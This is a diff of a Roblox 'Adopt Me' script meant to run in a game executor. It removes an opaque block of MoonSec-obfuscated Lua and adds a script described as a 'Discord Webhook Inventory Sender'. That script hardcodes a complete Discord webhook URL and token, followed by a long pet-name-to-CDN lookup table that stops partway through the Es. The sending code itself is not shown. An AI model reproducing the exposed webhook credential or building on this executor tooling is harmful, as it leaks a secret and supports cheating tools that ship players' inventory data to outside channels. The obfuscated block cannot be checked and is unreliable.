@@ -1,1 +1,577 @@
-([[This file was protected with MoonSec V3]]):gsub('.+', (function(a) _yZd_hvEMguwg = a; end)); return(function(u,...)local o;local t;local r;local s;local f;local d;local e=24915;local n=0;local l={};while n<796 do n=n+1;while n<0x213 and e%0x2246<0x1123 do n=n+1 e=(e+809)%13777 local a=n+e if(e%0xacc)>=0x566 then e=(e*0x24e)%0xa943 while n<0xca and e%0xed8<0x76c do n=n+1 e=(e-52)%14179 local f=n+e if(e%0x1da8)>0xed4 then e=(e-0x2b)%0x9e19 local e=27846 if not l[e]then l[e]=0x1 t=getfenv and getfenv();end elseif e%2~=0 then e=(e*0x34d)%0x1f70 local e=55279 if not l[e]then l[e]=0x1 s=tonumber;end else e=(e*0xcf)%0x42bb n=n+1 local e=26265 if not l[e]then l[e]=0x1 d=function(l)local e=0x01 local function n(n)e=e+n return l:sub(e-n,e-0x01)end while true do local l=n(0x01)if(l=="\5")then break end local e=r.byte(n(0x01))local e=n(e)if l=="\2"then e=o.CraX_eDk(e)elseif l=="\3"then e=e~="\0"elseif l=="\6"then t[e]=function(e,n)return u(8,nil,u,n,e)end elseif l=="\4"then e=t[e]elseif l=="\0"then e=t[e][n(r.byte(n(0x01)))];end local n=n(0x08)o[n]=e end end end end end elseif e%2~=0 then e=(e+0x21a)%0xbeb8 while n<0xee and e%0x2738<0x139c do n=n+1 e=(e*664)%40936 local t=n+e if(e%0x1320)<=0x990 then e=(e-0x79)%0x5d3 local e=76160 if not l[e]then l[e]=0x1 r=string;end elseif e%2~=0 then e=(e*0x195)%0xc60 local e=44238 if not l[e]then l[e]=0x1 end else e=(e+0x191)%0x4e77 n=n+1 local e=81718 if not l[e]then l[e]=0x1 o={};end end end else e=(e-0x3cc)%0xd8 n=n+1 while n<0x12e and e%0x3cd6<0x1e6b do n=n+1 e=(e*982)%30406 local d=n+e if(e%0x244e)>=0x1227 then e=(e+0x389)%0x680b local e=44562 if not l[e]then l[e]=0x1 t=(not t)and _ENV or t;end elseif e%2~=0 then e=(e-0x1d0)%0x9baf local e=17325 if not l[e]then l[e]=0x1 end else e=(e+0x2db)%0x18f2 n=n+1 local e=65517 if not l[e]then l[e]=0x1 f="\4\8\116\111\110\117\109\98\101\114\67\114\97\88\95\101\68\107\0\6\115\116\114\105\110\103\4\99\104\97\114\105\108\105\89\117\111\102\97\0\6\115\116\114\105\110\103\3\115\117\98\102\95\85\80\100\80\102\118\0\6\115\116\114\105\110\103\4\98\121\116\101\102\121\87\90\67\118\105\75\0\5\116\97\98\108\101\6\99\111\110\99\97\116\104\80\111\100\102\103\71\68\0\5\116\97\98\108\101\6\105\110\115\101\114\116\116\118\69\117\103\112\66\114\5";end end end end end e=(e*969)%21845 end d(f);local e={};for n=0x0,0xff do local l=o.iliYuofa(n);e[n]=l;e[l]=n;end local function c(n)return e[n];end local r=(function(a,r)local f,l=0x01,0x10 local n={{},{},{}}local t=-0x01 local e=0x01 local d=a while true do n[0x03][o.f_UPdPfv(r,e,(function()e=f+e return e-0x01 end)())]=(function()t=t+0x01 return t end)()if t==(0x0f)then t=""l=0x000 break end end local t=#r while e<t+0x01 do n[0x02][l]=o.f_UPdPfv(r,e,(function()e=f+e return e-0x01 end)())l=l+0x01 if l%0x02==0x00 then l=0x00 o.tvEugpBr(n[0x01],(c((((n[0x03][n[0x02][0x00]]or 0x00)*0x10)+(n[0x03][n[0x02][0x01]]or 0x00)+d)%0x100)));d=a+d;end end return o.hPodfgGD(n[0x01])end);d(r(72,"S6M_1nXyH5l9Ir8b9r"));d(r(24,"LQeBC^k&x3+O>6;z;x6keOQCz+63>k+&e>&Ck6C6BxQ6G6;C+3>&&z&^^&zC66B.0OzQ;C>>O6xk^3COCzBC<6;&x3&^>xOe3Q&;k>^Qe+Q6EC>3>?+&xCe%o;kBC>BeQQz;6zk^O^3Qx>kB^2e&ez2B;Q>COz3:kzQcz>C6e3eCFwx^6COC363x&x^+exe+;;6^63+>OBBCeC&BC6CCe^f^z>6Q>>+Qx+&>^6B+J6-zz:zQO>OQ3eeCWzCkB6eBQ>zz;+3BOJ&QkB&e^BC QOzBx>&C>z+Q3QxCC>C3BknC;6;^6e3kB+eQCQ^&CxMk;+X^;x6jOzBCeW&C^&CBe>QezQ6;OzOBkO&B^3BQQwze6Oxrk6>C33xe&C^^6;B^Qk*}63>BOBxBkCC&CleQ_^;OzO&C^;O^3kxM^3CBBBQOz6>kOC3B++3Q^xzC66BdQ+z3;k6C363&x+k+Bxezex;ex>&k>O+^3C&^^O^CB2Qzz+>k>OO;+6kQ}xzCC^eQQ>zx&6>kOC3zx&&ee+B61>zx;;666DxBe6"));local e=(-15408+(function()local l,e=0,1;(function(e,n)e(e(n,n),e(n,n)and e(n and e,e))end)(function(t,n)if l>100 then return n end l=l+1 e=(e+911)%21097 if(e%1912)>=956 then e=(e*406)%23805 return n(t(t,t),n(n and n,n))else return t end return n end,function(n,t)if l>241 then return n end l=l+1 e=(e-1003)%29842 if(e%1428)>714 then e=(e-121)%49239 return n(n(t,t and t),n(t,n))else return n end return t end)return e;end)())local ne=(getfenv)or(function()return _ENV end);local h=o.keFLCrqP or o.SLGXQMKs;local d=2;local t=3;local ee=1;local a=4;local function m(b,...)local f=r(e,"rNM=DB)qP8?v 1{n81N{?1=  vq={8qPSq{=8DM=vNMB )B=1{)NNN8{MDvPDy1v=n{nq8xP8P=78MBD{=qRP1M+?v=? 8vnDP{=)?8DD?vMDN1Gv=B){)qnvv8pMMvD= P)) {BP) M?N=Mv{BM1MBnnnqn_1BP={vnB81 M=1n8SNn?1MN MDn8v)*  MP DD)1B)DBMnv)vEDP{M) =MNvP)Nn{Pnp{=P BBD{=qM9Nn?Nq{{=11BBv{?q8B1h?PvMqvM=D nB)vMhn?vM1v Dv=D11BNnM8VNPPBM1 BBM Dq8 qN1MB=v ?B8B*{vq?oB8q{1qN#C DBPnNqO6v81N{qq=v1))=vDqBN=8vn* qDD1W)BnvP?NB? nqPPNP?P=?  BD{Mq8t}8MMD?nDN  B1{{q{h{8?M= {))0{q==bPND 1v)Bn?D1N?q8={?{BBvn)8n18Nn vB5M1==?vNP=WDqnM=81D?11BB1%D=ngqBMD8BBE1B)N1?)8N8qPNB8)Mn1 )PwMP8N?qDmD?nM1{DP#{)q8MD8BN8 1MMqnN)81M vv8nD  1)8nDq)NN8P MBP{K)nn{1B8-Nn??Niv1Bvq)E 8DM=vM?{=8 1D1{n)1kvM?%7DP1q))B1nPPqNM?Dn?q{_11nB1LMDPN:?N=vv{B?1)qPzBP)MM?M=1 v)A{0qPi1B)N?vBDM8=)qnNq=y8)=nNPD=18?D? MBN1)?=M)v1BN?NqBKMP_NM?M=n nDn1?qDn 8PNqv=Dq87B1nBq78{=qv Dv1?1B)q{Pq?NP?P=BvvDn1qnn8BN1? =vMNv{D?1nqBYDPn ?DM1N)F{nPBs18 MvvvD81P)q}P8?ND?==M MBa1n){on8NNv??=8  Bq{)qBM??DMMvNDd1BB{{{q J{8?M1 NDq1))Bn?P=N=?N=D PD{11) mMP?N??P=q vBB{Dq=A=8NM>?nBF11B {vq?Nt8PMqv)Bq{M)=nMPNN88nM{v1B{n=)?n8PPN{?)=B D)BnMqN_&PnMD?1=  v) {?qPgq8)M1vDD=1Mq=sDqnV{81=?vvD?18q?lnP)NB?D=P MBN{fPNhvP1N ?vDB 8BP{qPPNP8DM=vMD{1%Bn{{PnN18vMvv8D?1q))nB?DM=?M=M JBJ1{qqn 81Nn?8=v q)M{BqD>=8M=Dv#Da {)c{ qv-?88= vqD)1B)Dn=PDNN?gDqv{D11 ) n?P?NP?qBp BBD{=q=ON8xNn?{=1  Bv{?");local n=0;o.uVAKgdUG(function()o.TinTUejF()n=n+1 end)local function e(e,l)if l then return n end;n=e+n;end local l,n,c=u(0,u,e,f,o.fyWZCviK);local function r()local n,l=o.fyWZCviK(f,e(1,3),e(5,6)+2);e(2);return(l*256)+n;end;local k=true;local k=0 local function z()local t=n();local e=n();local d=1;local t=(l(e,1,20)*(2^32))+t;local n=l(e,21,31);local e=((-1)^l(e,32));if(n==0)then if(t==k)then return e*0;else n=1;d=0;end;elseif(n==2047)then return(t==0)and(e*(1/0))or(e*(0/0));end;return o.jPjFEaLk(e,n-1023)*(d+(t/(2^52)));end;local _=n;local function g(n)local l;if(not n)then n=_();if(n==0)then return'';end;end;l=o.f_UPdPfv(f,e(1,3),e(5,6)+n-1);e(n)local e=""for n=(1+k),#l do e=e..o.f_UPdPfv(l,n,n)end return e;end;local k=#o.sCcaQHBC(s('\49.\48'))~=1 local e=n;local function m(...)return{...},o.hobFcnuA('#',...)end local function y()local s={};local e={};local h={};local u={h,s,nil,e};local e=n()local f={}for t=1,e do local l=c();local n;if(l==1)then n=(c()~=#{});elseif(l==2)then local e=z();if k and o.WwcYTgPG(o.sCcaQHBC(e),'.(\48+)$')then e=o.BmTXfmxC(e);end n=e;elseif(l==0)then n=g();end;f[t]=n;end;for u=1,n()do local e=c();if(l(e,1,1)==0)then local o=l(e,2,3);local c=l(e,4,6);local e={r(),r(),nil,nil};if(o==0)then e[t]=r();e[a]=r();elseif(o==#{1})then e[t]=n();elseif(o==b[2])then e[t]=n()-(2^16)elseif(o==b[3])then e[t]=n()-(2^16)e[a]=r();end;if(l(c,1,1)==1)then e[d]=f[e[d]]end if(l(c,2,2)==1)then e[t]=f[e[t]]end if(l(c,3,3)==1)then e[a]=f[e[a]]end h[u]=e;end end;for e=1,n()do s[e-(#{1})]=y();end;u[3]=c();return u;end;local function p(l,e,n)local t=e;local t=n;return s(o.WwcYTgPG(o.WwcYTgPG(({o.uVAKgdUG(l)})[2],e),n))end local function j(b,e,f)local function y(...)local r,y,k,p,s,n,c,g,_,z,j,l;local e=0;while-1<e do if 2<e then if 4>=e then if 4==e then z=o.hobFcnuA('#',...)-1;j={};else g={};_={...};end else if 2~=e then repeat if e<6 then l=u(7);break;end;e=-2;until true;else l=u(7);end end else if e>=1 then if 0<e then repeat if 1~=e then n=-41;c=-1;break;end;k=u(6,35,3,68,b);s=m p=0;until true;else k=u(6,35,3,68,b);s=m p=0;end else r=u(6,79,1,68,b);y=u(6,54,2,63,b);end end e=e+1;end;for e=0,z do if(e>=k)then g[e-k]=_[e+1];else l[e]=_[e+1];end;end;local e=z-k+1 local e;local o;local function u(...)while true do end end while true do if n<-40 then n=n+42 end e=r[n];o=e[ee];if o>=12 then if 18<=o then if o>20 then if 23<=o then if o>20 then repeat if 24>o then l[e[d]]();break;end;n=e[t];until true;else n=e[t];end else if o~=22 then l(e[d],e[t]);else if(l[e[d]]==e[a])then n=n+1;else n=e[t];end;end end else if 18<o then if o>=15 then repeat if o~=20 then l[e[d]]=f[e[t]];break;end;l[e[d]]=(e[t]~=0);until true;else l[e[d]]=(e[t]~=0);end else local d=e[d];local n=l[e[t]];l[d+1]=n;l[d]=n[e[a]];end end else if o>=15 then if o<16 then local n=e[d]local t,e=s(l[n](h(l,n+1,e[t])))c=e+n-1 local e=0;for n=n,c do e=e+1;l[n]=t[e];end;else if o<17 then l(e[d],e[t]);else local o,k,b,z,u;l[e[d]]=f[e[t]];n=n+1;e=r[n];o=e[d];k=l[e[t]];l[o+1]=k;l[o]=k[e[a]];n=n+1;e=r[n];l(e[d],e[t]);n=n+1;e=r[n];o=e[d]b,z=s(l[o](h(l,o+1,e[t])))c=z+o-1 u=0;for e=o,c do u=u+1;l[e]=b[u];end;n=n+1;e=r[n];o=e[d]l[o]=l[o](h(l,o+1,c))n=n+1;e=r[n];l[e[d]]();n=n+1;e=r[n];do return end;end end else if o>12 then if 12<=o then repeat if 14>o then l[e[d]]=f[e[t]];break;end;for o=0,6 do if 2>=o then if 1<=o then if o==1 then l(e[d],e[t]);n=n+1;e=r[n];else f[e[t]]=l[e[d]];n=n+1;e=r[n];end else f[e[t]]=l[e[d]];n=n+1;e=r[n];end else if o<5 then if o>0 then repeat if 3~=o then f[e[t]]=l[e[d]];n=n+1;e=r[n];break;end;l(e[d],e[t]);n=n+1;e=r[n];until true;else l(e[d],e[t]);n=n+1;e=r[n];end else if o>2 then repeat if 5~=o then f[e[t]]=l[e[d]];break;end;l(e[d],e[t]);n=n+1;e=r[n];until true;else f[e[t]]=l[e[d]];end end end end until true;else l[e[d]]=f[e[t]];end else local e=e[d]l[e]=l[e](h(l,e+1,c))end end end else if o<6 then if 2<o then if 3>=o then local n=e[d]local t,e=s(l[n](h(l,n+1,e[t])))c=e+n-1 local e=0;for n=n,c do e=e+1;l[n]=t[e];end;else if o>0 then for n=37,93 do if o~=5 then l[e[d]]();break;end;do return end;break;end;else do return end;end end else if o<1 then local e=e[d]l[e]=l[e](h(l,e+1,c))else if 2>o then do return end;else if(l[e[d]]==e[a])then n=n+1;else n=e[t];end;end end end else if o>=9 then if o<=9 then n=e[t];else if 11~=o then f[e[t]]=l[e[d]];else local n=e[d];local t=l[e[t]];l[n+1]=t;l[n]=t[e[a]];end end else if 7>o then f[e[t]]=l[e[d]];else if o<8 then for o=0,3 do if o>1 then if o~=0 then for c=49,95 do if o~=2 then if(l[e[d]]==e[a])then n=n+1;else n=e[t];end;break;end;l[e[d]]=f[e[t]];n=n+1;e=r[n];break;end;else if(l[e[d]]==e[a])then n=n+1;else n=e[t];end;end else if 1==o then f[e[t]]=l[e[d]];n=n+1;e=r[n];else l[e[d]]=(e[t]~=0);n=n+1;e=r[n];end end end else l[e[d]]=(e[t]~=0);end end end end end n=1+n;end;end;return y end;local d=0xff;local c={};local r=(1);local t='';(function(n)local l=n local f=0x00 local e=0x00 l={(function(a)if f>0x31 then return a end f=f+1 e=(e+0x8fb-a)%0x14 return(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x16);d[2]=(d[2]*(p(function()c()end,h(t))-p(d[1],h(t))))+1;c[r]={};d=d[2];r=r+d;end return true end)'RzWbH'and l[0x2](0x30b+a))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xe5);end return true end)'xhbSe'and l[0x3](a+0x3e3))or(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xca);t={t..'\58 a',t};c[r]=y();r=r+((not o.mudAwGUO)and 1 or 0);t[1]='\58'..t[1];d[2]=0xff;end return true end)'XMQhj'and l[0x1](a+0x2f7))or a end),(function(t)if f>0x2d then return t end f=f+1 e=(e+0x1287-t)%0x25 return(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x47);end return true end)'sZo_E'and l[0x1](0xa5+t))or(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x28);c[r]=ne();r=r+d;end return true end)'ucESt'and l[0x3](t+0x2dc))or(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x6e);end return true end)'bWpGR'and l[0x2](t+0x33c))or t end),(function(o)if f>0x20 then return o end f=f+1 e=(e+0xdba-o)%0x3f return(e%0x03==0x2 and(function(l)if not n[l]then e=e+0x01 n[l]=(0xf5);end return true end)'afUxq'and l[0x2](0x1b5+o))or(e%0x03==0x0 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x5);t='\37';d={function()d()end};t=t..'\100\43';end return true end)'FTwyF'and l[0x1](o+0xa2))or(e%0x03==0x1 and(function(l)if not n[l]then e=e+0x01 n[l]=(0x55);end return true end)'UBBzK'and l[0x3](o+0x1db))or o end)}l[0x3](0x15af)end){};local e=j(h(c));return e(...);end return m((function()local n={}local e=0x01;local l;if o.mudAwGUO then l=o.mudAwGUO(m)else l=''end if o.WwcYTgPG(l,o.qbmlIXWL)then e=e+0;else e=e+1;end n[e]=0x02;n[n[e]+0x01]=0x03;return n;end)(),...)end)((function(e,n,l,t,d,o)local o;if 4>e then if e<2 then if-3<=e then for o=27,97 do if e>0 then do return function(n,e,l)if l then local e=(n/2^(e-1))%2^((l-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(n%(e+e)>=e)and 1 or 0;end;end;end;break;end;do return n(1),n(4,d,t,l,n),n(5,d,t,l)end;break;end;else do return function(n,e,l)if l then local e=(n/2^(e-1))%2^((l-1)-(e-1)+1);return e-e%1;else local e=2^(e-1);return(n%(e+e)>=e)and 1 or 0;end;end;end;end else if-1<e then repeat if 3~=e then do return 16777216,65536,256 end;break;end;do return n(1),n(4,d,t,l,n),n(5,d,t,l)end;until true;else do return 16777216,65536,256 end;end end else if e<6 then if 0<=e then for o=25,94 do if 4~=e then local e=t;do return function()local n=n(l,e(e,e),e(e,e));e(1);return n;end;end;break;end;local e=t;local t,o,r=d(2);do return function()local d,l,f,n=n(l,e(e,e),e(e,e)+3);e(4);return(n*t)+(f*o)+(l*r)+d;end;end;break;end;else local e=t;local o,d,t=d(2);do return function()local r,l,f,n=n(l,e(e,e),e(e,e)+3);e(4);return(n*o)+(f*d)+(l*t)+r;end;end;end else if e>=7 then if e>=5 then for n=13,83 do if 7<e then do return l(e,nil,l);end break;end;do return setmetatable({},{['__\99\97\108\108']=function(e,l,d,t,n)if n then return e[n]elseif t then return e else e[l]=d end end})end break;end;else do return setmetatable({},{['__\99\97\108\108']=function(e,l,t,d,n)if n then return e[n]elseif d then return e else e[l]=t end end})end end else do return d[l]end;end end end end),...)
+-- Adopt Me Pet CDN Lookup + Discord Webhook Inventory Sender
+-- Run this in your executor
+
+-- =====================
+--    YOUR WEBHOOK URL
+-- =====================
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1454419132371042358/U45TbmAIksgoEDwC8fXrhlMe0w6lEVQ2KRjOCL2OeI_eiy4ZZA6Lfi7J280unr5vgXo1"
+
+-- =====================
+--    CDN BASE URL
+-- =====================
+local CDN = "https://cdn.playadopt.me/items/"
+
+-- =====================
+--  FULL PET CDN TABLE
+-- =====================
+local PetCDN = {
+    -- A
+    ["2021 Uplift Butterfly"]          = "2021_uplift_butterfly",
+    ["2022 Uplift Butterfly"]          = "birthday_2022_uplift_butterfly",
+    ["2025 Birthday Butterfly"]        = "birthday_2025_butterfly",
+    ["2D Kitty"]                       = "2d_tuesdays_2025_2d_kitty",
+    ["Abyssinian Cat"]                 = "desert_2022_abyssinian_cat",
+    ["Admin Abuse Egg"]                = "admin_abuse_egg_2026_egg",
+    ["African Wild Dog"]               = "ugc_refresh_2023_african_wild_dog",
+    ["Albatross"]                      = "snow_2022_albatross",
+    ["Albino Bat"]                     = "albino_bat",
+    ["Albino Gorilla"]                 = "gorilla_fair_2023_albino_gorilla",
+    ["Albino Monkey"]                  = "albino_monkey",
+    ["Alicorn"]                        = "basic_egg_2022_alicorn",
+    ["Alley Cat"]                      = "urban_2023_alley_cat",
+    ["Alpaca"]                         = "farm_2023_alpaca",
+    ["Amami Rabbit"]                   = "lny_2023_amami_rabbit",
+    ["Amber Butterfly"]                = "butterfly_2025_amber_butterfly",
+    ["Ancient Dragon"]                 = "basic_egg_2022_ancient_dragon",
+    ["Angelfish"]                      = "jungle_2023_angelfish",
+    ["Angler Fish"]                    = "danger_2023_angler_fish",
+    ["Angus Bull"]                     = "winter_2025_angus_bull",
+    ["Angus Calf"]                     = "winter_2025_angus_calf",
+    ["Angus Cow"]                      = "winter_2025_angus_cow",
+    ["Ankylosaurus"]                   = "fossil_2024_ankylosaurus",
+    ["Ant"]                            = "basic_egg_2022_ant",
+    ["Apple Owl"]                      = "food_pets_2026_apple_owl",
+    ["Arctic Dusk Dragon"]             = "winter_2025_arctic_dusk_dragon",
+    ["Arctic Fox"]                     = "arctic_fox",
+    ["Arctic Hare"]                    = "winter_2023_arctic_hare",
+    ["Arctic Reindeer"]                = "arctic_reindeer",
+    ["Arctic Tern"]                    = "summerfest_2023_arctic_tern",
+    ["Armadillo"]                      = "desert_2024_armadillo",
+    ["Ash Zebra"]                      = "lures_2023_ash_zebra",
+    ["Astronaut Gorilla"]              = "gorilla_fair_2023_astronaut_gorilla",
+    ["Aurora Fox"]                     = "winter_2024_aurora_fox",
+    ["Aussie Egg"]                     = "aussie_egg",
+    ["Australian Kelpie"]              = "kelpie",
+    ["Axolotl"]                        = "axolotl",
+    ["Aye Aye"]                        = "halloween_2025_aye_aye",
+    ["Aztec Egg"]                      = "aztec_egg_2025_aztec_egg",
+    -- B
+    ["Badger"]                         = "fall_2022_badger",
+    ["Bakeneko"]                       = "spring_2025_bakeneko",
+    ["Baku"]                           = "japan_2022_baku",
+    ["Bald Eagle"]                     = "summerfest_2024_bald_eagle",
+    ["Bali Starling"]                  = "seasia_2023_bali_starling",
+    ["Balloon Unicorn"]                = "summerfest_2024_balloon_unicorn",
+    ["Banded Palm Civet"]              = "seasia_2023_banded_palm_civet",
+    ["Bandicoot"]                      = "bandicoot",
+    ["Basic Egg"]                      = "pet_recycler_2025_basic_egg",
+    ["Basilisk"]                       = "halloween_2022_basilisk",
+    ["Bat"]                            = "bat",
+    ["Bat Dragon"]                     = "bat_dragon",
+    ["Bauble Buddies"]                 = "winter_2024_bauble_buddies",
+    ["Beaver"]                         = "beaver",
+    ["Bee"]                            = "bee",
+    ["Beluga Whale"]                   = "winter_2023_beluga_whale",
+    ["Berry Cool Cube"]                = "winter_2024_berry_cool_cube",
+    ["Billy Goat"]                     = "urban_2023_billy_goat",
+    ["Binturong"]                      = "seasia_2023_binturong",
+    ["Bird of Paradise"]               = "jungle_2023_bird_of_paradise",
+    ["Birthday Butterfly 2023"]        = "birthday_2023_birthday_butterfly",
+    ["Birthday Butterfly 2024"]        = "birthday_2024_butterfly",
+    ["Black Chow-Chow"]                = "vip_2022_chow_chow_black",
+    ["Black Kite"]                     = "urban_2023_black_kite",
+    ["Black Macaque"]                  = "seasia_2023_black_macaque",
+    ["Black Marlin"]                   = "sunshine_2024_black_marlin",
+    ["Black Moon Bear"]                = "lny_2023_moon_bear",
+    ["Black Panther"]                  = "black_panther",
+    ["Black Rhino"]                    = "endangered_2026_black_rhino",
+    ["Black Springer Spaniel"]         = "easter_2022_springer_spaniel_black",
+    ["Black Tiger"]                    = "endangered_2026_black_tiger",
+    ["Black Widow"]                    = "halloween_2025_spider_4",
+    ["Black-Chested Pheasant"]         = "fall_2022_pheasant_black",
+    ["Black-Footed Ferret"]            = "endangered_2026_black_footed_ferret",
+    ["Blazing Lion"]                   = "lures_2023_blazing_lion",
+    ["Bloodhound"]                     = "jan_refresh_2023_bloodhound",
+    ["Blossom Snake"]                  = "lunar_2025_blossom_snake",
+    ["Blue Betta Fish"]                = "summerfest_2024_blue_betta_fish",
+    ["Blue Butterfly"]                 = "butterfly_2025_blue_butterfly",
+    ["Blue Dog"]                       = "blue_dog",
+    ["Blue Egg"]                       = "pet_egg",
+    ["Blue Jay"]                       = "garden_2024_blue_jay",
+    ["Blue Ringed Octopus"]            = "danger_2023_blue_ringed_octopus",
+    ["Blue Whale"]                     = "endangered_2026_blue_whale",
+    ["Bluebottle Fly"]                 = "urban_2023_fly",
+    ["Border Collie"]                  = "springfest_2023_border_collie",
+    ["Borhyaena Gigantica"]            = "danger_2023_borhyaena_gigantica",
+    ["Brachiosaurus"]                  = "fossil_2024_brachiosaurus",
+    ["Brown Bear"]                     = "brown_bear",
+    ["Brown Springer Spaniel"]         = "easter_2022_springer_spaniel_brown",
+    ["Brown-Chested Pheasant"]         = "fall_2022_pheasant_brown",
+    ["Buffalo"]                        = "buffalo",
+    ["Bullfrog"]                       = "woodland_2022_bullfrog",
+    ["Bunny"]                          = "bunny",
+    ["Bunny Swirl"]                    = "winter_2025_bunny_swirl",
+    ["Burning Bunny"]                  = "fire_dimension_2024_burning_bunny",
+    ["Bush Elephant"]                  = "sunshine_2024_bush_elephant",
+    ["Business Monkey"]                = "business_monkey",
+    -- C
+    ["Cabbit"]                         = "spring_2025_cabbit",
+    ["Cactus Friend"]                  = "desert_2024_cactus_friend",
+    ["Caelum Cervi"]                   = "pride_2023_caelum_cervi",
+    ["California Condor"]              = "endangered_2026_california_condor",
+    ["Camel"]                          = "basic_egg_2022_camel",
+    ["Canadian Goose"]                 = "farm_2023_canada_goose",
+    ["Candicorn"]                      = "sugarfest_2026_candicorn",
+    ["Candy Cane Snail"]               = "easter_2024_candy_cane_snail",
+    ["Candy Hare"]                     = "winter_2023_candy_hare",
+    ["Candyfloss Chick"]               = "easter_2024_candyfloss_chick",
+    ["Capricorn"]                      = "space_house_2022_capricorn",
+    ["Capuchin Monkey"]                = "capuchin_2024_capuchin_monkey",
+    ["Capybara"]                       = "capybara",
+    ["Cassowary"]                      = "jungle_2023_cassowary",
+    ["Castle Hermit Crab"]             = "summerfest_2023_castle_hermit_crab",
+    ["Cat"]                            = "cat",
+    ["Caterpillar"]                    = "farm_2023_caterpillar",
+    ["Cerberus"]                       = "cerberus",
+    ["Chameleon"]                      = "rgb_chameleon",
+    ["Chanekeh"]                       = "aztec_egg_2025_xiucohtl",
+    ["Cheetah"]                        = "sunshine_2024_cheetah",
+    ["Chef Gorilla"]                   = "gorilla_fair_2023_chef_gorilla",
+    ["Cherub Chipmunk"]                = "valentines_2026_cherub_chipmunk",
+    ["Chick"]                          = "chick",
+    ["Chickatrice"]                    = "halloween_2022_chickatrice",
+    ["Chicken"]                        = "chicken",
+    ["Chilling Spider"]                = "halloween_2025_spider_5",
+    ["Chimera"]                        = "halloween_2022_chimera",
+    ["Chipmunk"]                       = "chiprac_2023_chipmunk",
+    ["Choco Penguin"]                  = "penguins_2025_choco_penguin",
+    ["Chocolate Chip Bat Dragon"]      = "winter_2023_chocolate_chip_bat_dragon",
+    ["Chocolate Chow-Chow"]            = "vip_2022_chow_chow_dark_brown",
+    ["Chocolate Labrador"]             = "chocolate_labrador",
+    ["Christmas Egg"]                  = "christmas_egg",
+    ["Christmas Future Egg"]           = "winter_2023_story_game_egg",
+    ["Christmas Pudding Pup"]          = "winter_2023_christmas_pudding_pup",
+    ["Christmas Spirit"]               = "winter_2025_christmas_spirit",
+    ["Classic Teapot"]                 = "roblox_classic_2024_teapot",
+    ["Clementine Owl"]                 = "food_pets_2026_clementine_owl",
+    ["Clover Cow"]                     = "st_patricks_2025_clover_cow",
+    ["Clownfish"]                      = "clownfish",
+    ["Cobra"]                          = "cobra",
+    ["Cockroach"]                      = "urban_2023_cockroach",
+    ["Cocoadile"]                      = "sugarfest_2026_cocoadile",
+    ["Coconut Friend"]                 = "summerfest_2025_coconut_friend",
+    ["Cold Cube"]                      = "winter_2024_cold_cube",
+    ["Corgi"]                          = "basic_egg_2022_corgi",
+    ["Corn Doggo"]                     = "summerfest_2024_corn_doggo",
+    ["Cow"]                            = "cow",
+    ["Cow Calf"]                       = "summerfest_2024_cow_calf",
+    ["Coyote"]                         = "desert_2024_coyote",
+    ["Cozy Mistletroll"]               = "winter_2025_cozy_mistletroll",
+    ["Crab"]                           = "crab",
+    ["Cracked Egg"]                    = "cracked_egg",
+    ["Criosphinx"]                     = "desert_2024_criosphinx",
+    ["Crocodile"]                      = "crocodile",
+    ["Crow"]                           = "crow",
+    ["Cryptid"]                        = "halloween_2025_cryptid",
+    ["Crystal Egg"]                    = "pet_recycler_2025_crystal_egg",
+    ["Cuddly Candle"]                  = "sky_ux_2023_cuddly_candle",
+    ["Cupid Dragon"]                   = "valentines_2025_cupid_dragon",
+    ["Cute-A-Cabra"]                   = "halloween_2023_cuteacabra",
+    -- D
+    ["Dalmatian"]                      = "santa_dog",
+    ["Dancing Dragon"]                 = "lny_2022_dragon",
+    ["Danger Egg"]                     = "danger_2023_egg",
+    ["Dango Penguins"]                 = "penguins_2025_dango_penguins",
+    ["Deathstalker Scorpion"]          = "desert_2024_deathstalker_scorpion",
+    ["Deinonychus"]                    = "deinonychus",
+    ["Desert Egg"]                     = "desert_2024_egg",
+    ["Diamond Albatross"]              = "snow_2022_diamond_albatross",
+    ["Diamond Amazon"]                 = "rain_2023_diamond_amazon",
+    ["Diamond Butterfly"]              = "sanctuary_2022_diamond_premium_butterfly",
+    ["Diamond Dragon"]                 = "diamond_dragon",
+    ["Diamond Egg"]                    = "diamond_egg",
+    ["Diamond Griffin"]                = "diamond_griffin",
+    ["Diamond Hamster"]                = "hamstertime_2024_diamond_hamster",
+    ["Diamond Hummingbird"]            = "subscription_2024_diamond_hummingbird",
+    ["Diamond King Penguin"]           = "ice_cream_refresh_2022_diamond_king_penguin",
+    ["Diamond Ladybug"]                = "diamond_ladybug",
+    ["Diamond Mahi Mahi"]              = "beach_2024_diamond_mahi_mahi",
+    ["Diamond Unicorn"]                = "diamond_unicorn",
+    ["Dilophosaurus"]                  = "dilophosaurus",
+    ["Dimension Drifter"]              = "moon_2025_dimension_drifter",
+    ["Dimorphodon"]                    = "fossil_2024_dimorphodon",
+    ["Dingo"]                          = "dingo",
+    ["Dire Stag"]                      = "halloween_2023_dire_stag",
+    ["Dire Wolf"]                      = "egg_teaser_2026_dire_wolf",
+    ["DJ Snooze"]                      = "halloween_2025_dj_snooze",
+    ["Dodo"]                           = "dodo",
+    ["Dog"]                            = "dog",
+    ["Dolphin"]                        = "dolphin",
+    ["Donkey"]                         = "basic_egg_2022_donkey",
+    ["Dotted Eggy"]                    = "easter_2024_dotted_eggy",
+    ["Dracula Fish"]                   = "ocean_2024_dracula_fish",
+    ["Dracula Parrot"]                 = "halloween_2024_dracula_parrot",
+    ["Dragon"]                         = "dragon",
+    ["Dragonfly"]                      = "basic_egg_2022_dragonfly",
+    ["Dragonfruit Fox"]                = "food_pets_2026_dragonfruit_fox",
+    ["Drake"]                          = "drake",
+    ["Dugong"]                         = "japan_2022_dugong",
+    ["Dylan"]                          = "dolls_2023_dylan",
+    -- E
+    ["Easter 2020 Egg"]                = "easter_2020_egg",
+    ["Eel"]                            = "random_pets_sept_2023_eel",
+    ["Eggnog Dog"]                     = "winter_2023_eggnog_dog",
+    ["Eggnog Hare"]                    = "winter_2023_eggnog_hare",
